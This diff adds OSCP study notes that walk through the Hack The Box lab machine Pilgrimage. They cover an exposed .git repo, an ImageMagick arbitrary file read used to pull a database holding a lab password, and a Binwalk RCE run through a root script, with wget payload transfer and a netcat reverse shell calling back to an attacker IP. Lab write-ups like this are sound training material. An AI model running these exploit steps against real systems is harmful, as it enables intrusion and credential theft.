@@ -1,0 +1,153 @@
+Pilgrimage HTB - OSCP Study Notes
+==================================
+
+Machine Info
+------------
+- Name: Pilgrimage
+- Release: 11th July 2023
+- Author: coopertim13
+- Difficulty: Easy
+- Classification: Official
+- Document No: D23.100.244
+- Prepared By: C4rm3l0
+
+Synopsis
+--------
+Pilgrimage is an easy Linux box with a web app exposing a .git repo. Vulnerable ImageMagick (CVE-2022-44268) allows arbitrary file read via PNG tEXt chunk. Credentials found in a SQLite DB allow SSH access. Privilege escalation is possible via Binwalk RCE (CVE-2022-4510) triggered by a root script monitoring uploads.
+
+Skills Required
+---------------
+- Web enumeration
+- Linux enumeration
+
+Skills Learned
+--------------
+- Source code review
+- Scripting
+- PNG file structure
+
+Enumeration
+-----------
+1. Nmap full port scan:
+   ```bash
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.219 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.219
+   ```
+   - Found: 22/tcp (SSH), 80/tcp (HTTP)
+
+2. Add domain to hosts:
+   ```bash
+   echo "10.10.11.219 pilgrimage.htb" | sudo tee -a /etc/hosts
+   ```
+
+3. Directory enumeration:
+   ```bash
+   feroxbuster --url http://pilgrimage.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
+   ```
+   - Found: .git directory exposed
+
+4. Dump .git repo:
+   ```bash
+   git-dumper http://pilgrimage.htb/ ./pilgrimage_source
+   ```
+
+Foothold
+--------
+1. Check ImageMagick version:
+   ```bash
+   ./magick --version
+   # Found: 7.1.0-49 (vulnerable)
+   ```
+
+2. Exploit CVE-2022-44268 (Arbitrary File Read):
+   - Clone PoC:
+     ```bash
+     git clone https://github.com/voidz0r/CVE-2022-44268.git
+     cd CVE-2022-44268
+     cargo run "/etc/passwd"
+     ```
+   - Upload generated PNG to web app, download processed image.
+   - Extract hex data:
+     ```bash
+     identify -verbose <downloaded_image>
+     # Copy hex chunk
+     tr -d '\n' < hex > hex_clean
+     python3 -c 'print(bytes.fromhex("<hex_data>"))'
+     ```
+   - Target SQLite DB:
+     ```bash
+     cargo run "/var/db/pilgrimage"
+     # Convert hex to file
+     python3 -c 'with open("hex", "rb") as f: data = bytes.fromhex(f.read().decode()); open("sql.db", "wb").write(data)'
+     sqlite3 sql.db
+     .tables
+     select * from users;
+     # Found: emily|abigchonkyboi123
+     ```
+
+3. SSH access:
+   ```bash
+   ssh emily@10.10.11.219
+   # Password: abigchonkyboi123
+   # Get user flag: /home/emily/user.txt
+   ```
+
+Privilege Escalation
+--------------------
+1. Check root processes:
+   ```bash
+   ps auxww | grep root
+   # Find: malwarescan.sh running as root
+   ```
+
+2. Review malwarescan.sh:
+   - Monitors /var/www/pilgrimage.htb/shrunk/ for new files
+   - Uses binwalk -e to extract files
+   - Vulnerable to CVE-2022-4510 (Binwalk RCE)
+
+3. Exploit Binwalk RCE:
+   - Clone PoC or use provided script:
+     ```bash
+     python3 cve.py dwn.png 10.10.14.4 4444
+     # Generates binwalk_exploit.png
+     ```
+   - Transfer exploit to target:
+     ```bash
+     python3 -m http.server
+     # On target:
+     cd /var/www/pilgrimage.htb/shrunk
+     wget http://10.10.14.4:8000/binwalk_exploit.png
+     ```
+   - Start listener:
+     ```bash
+     nc -nlvp 4444
+     # Wait for root shell
+     # Get root flag: /root/root.txt
+     ```
+
+Useful Commands
+---------------
+- Nmap: see above
+- Feroxbuster: see above
+- Git-dumper: see above
+- ImageMagick PoC: see above
+- Binwalk PoC: see above
+- SSH: see above
+- SQLite3: see above
+- Netcat: see above
+
+Tips for OSCP
+-------------
+- Always enumerate for exposed .git repos
+- Check for vulnerable image processing tools
+- Use PoCs for file read and RCE exploits
+- Convert hex data to files using Python
+- Use HTTP server + wget/curl for file transfer
+- Monitor root processes for privilege escalation vectors
+
+References
+----------
+- CVE-2022-44268: https://github.com/voidz0r/CVE-2022-44268
+- CVE-2022-4510: https://github.com/thereisnotime/binwalk_CVE-2022-4510
+- Official walkthrough: https://www.hackthebox.com/machines/Pilgrimage
+
